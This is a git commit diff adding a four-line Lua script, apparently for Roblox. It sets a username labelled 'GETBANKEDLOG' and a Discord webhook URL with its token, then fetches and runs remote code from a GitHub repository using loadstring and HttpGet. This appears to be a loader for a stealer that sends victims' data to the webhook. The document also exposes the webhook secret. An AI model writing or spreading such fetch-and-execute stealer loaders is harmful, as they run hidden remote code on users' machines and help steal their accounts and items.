50510b3672084dc418e47e48364e8760ffbcac32
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-11 00:00:17 +0200

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,4 @@
+UserName = "GETBANKEDLOG"
+WebHook = "https://discord.com/api/webhooks/1051237273062096926/X_8EeJ66Ejnwpujk9KEJohpdRyc5M1TZVdKgH_4kx0Cc2dWVsLPQ_dkVYbtpYVc6Iy9q"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
